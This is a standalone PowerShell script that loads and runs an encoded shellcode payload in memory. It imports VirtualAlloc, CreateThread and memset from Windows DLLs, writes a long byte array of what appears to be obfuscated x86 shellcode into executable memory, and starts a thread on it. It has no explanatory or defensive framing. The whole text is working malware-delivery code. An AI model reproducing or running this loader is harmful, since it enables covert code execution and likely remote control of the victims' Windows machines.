$Jged = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Jged -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x36,0x90,0x9c,0xd3,0xda,0xcd,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x55,0x13,0x83,0xed,0xfc,0x03,0x55,0x39,0x72,0x69,0x2f,0xad,0xf0,0x92,0xd0,0x2d,0x95,0x1b,0x35,0x1c,0x95,0x78,0x3d,0x0e,0x25,0x0a,0x13,0xa2,0xce,0x5e,0x80,0x31,0xa2,0x76,0xa7,0xf2,0x09,0xa1,0x86,0x03,0x21,0x91,0x89,0x87,0x38,0xc6,0x69,0xb6,0xf2,0x1b,0x6b,0xff,0xef,0xd6,0x39,0xa8,0x64,0x44,0xae,0xdd,0x31,0x55,0x45,0xad,0xd4,0xdd,0xba,0x65,0xd6,0xcc,0x6c,0xfe,0x81,0xce,0x8f,0xd3,0xb9,0x46,0x88,0x30,0x87,0x11,0x23,0x82,0x73,0xa0,0xe5,0xdb,0x7c,0x0f,0xc8,0xd4,0x8e,0x51,0x0c,0xd2,0x70,0x24,0x64,0x21,0x0c,0x3f,0xb3,0x58,0xca,0xca,0x20,0xfa,0x99,0x6d,0x8d,0xfb,0x4e,0xeb,0x46,0xf7,0x3b,0x7f,0x00,0x1b,0xbd,0xac,0x3a,0x27,0x36,0x53,0xed,0xae,0x0c,0x70,0x29,0xeb,0xd7,0x19,0x68,0x51,0xb9,0x26,0x6a,0x3a,0x66,0x83,0xe0,0xd6,0x73,0xbe,0xaa,0xbe,0xb0,0xf3,0x54,0x3e,0xdf,0x84,0x27,0x0c,0x40,0x3f,0xa0,0x3c,0x09,0x99,0x37,0x43,0x20,0x5d,0xa7,0xba,0xcb,0x9e,0xe1,0x78,0x9f,0xce,0x99,0xa9,0xa0,0x84,0x59,0x56,0x75,0x30,0x5f,0xc0,0x73,0x1e,0x95,0xb6,0x14,0xa2,0x2a,0xa7,0xb9,0x2b,0xcc,0x97,0x11,0x7c,0x41,0x57,0xc2,0x3c,0x31,0x3f,0x08,0xb3,0x6e,0x5f,0x33,0x19,0x07,0xf5,0xdc,0xf4,0x7f,0x61,0x44,0x5d,0x0b,0x10,0x89,0x4b,0x71,0x12,0x01,0x78,0x85,0xdc,0xe2,0xf5,0x95,0x88,0x02,0x40,0xc7,0x1e,0x1c,0x7e,0x62,0x9e,0x88,0x85,0x25,0xc9,0x24,0x84,0x10,0x3d,0xeb,0x77,0x77,0x36,0x22,0xe2,0x38,0x20,0x4b,0xe2,0xb8,0xb0,0x1d,0x68,0xb9,0xd8,0xf9,0xc8,0xea,0xfd,0x05,0xc5,0x9e,0xae,0x93,0xe6,0xf6,0x03,0x33,0x8f,0xf4,0x7a,0x73,0x10,0x06,0xa9,0x85,0x6c,0xd1,0x97,0xf3,0x9c,0xe1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$k4Al=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($k4Al.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$k4Al,0,0,0);for (;;){Start-sleep 60};
